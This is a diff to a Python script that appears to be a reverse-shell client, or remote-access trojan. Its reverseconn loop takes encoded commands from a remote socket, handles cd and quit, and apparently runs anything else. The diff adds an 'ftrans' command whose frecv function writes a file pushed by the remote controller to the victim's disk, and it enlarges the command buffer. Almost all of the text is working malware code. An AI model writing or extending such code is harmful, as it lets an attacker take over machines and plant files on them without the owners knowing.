@@ -8,6 +8,26 @@ import ctypes
 
 s=socket.socket()
 
+def frecv(sck):
+
+    fname=sck.recv(1024)
+
+    fname=fname.decode()
+
+    print(fname)
+
+    fsize=sck.recv(1024)
+
+    print(int(fsize.decode()))
+
+    fhandle=open(fname,'wb')
+
+    fhandle.write(sck.recv(int(fsize.decode())))
+
+    print("Written")
+
+    fhandle.close()
+
 def dec(txt):
 
 	i=0
@@ -60,7 +80,7 @@ def reverseconn():
 
     while True:
 
-        recvcmd=s.recv(1024)
+        recvcmd=s.recv(2**24)
 
         if dec(recvcmd[:2].decode("utf-8"))=="cd":
 
@@ -71,6 +91,10 @@ def reverseconn():
         elif dec(recvcmd.decode("utf-8"))=="quit":
 
             break
+
+        elif dec(recvcmd[:6].decode("utf-8"))=="ftrans":
+
+            frecv(s)
 
         elif len(recvcmd)>0 and dec(recvcmd[:2].decode("utf-8"))!="cd":
 
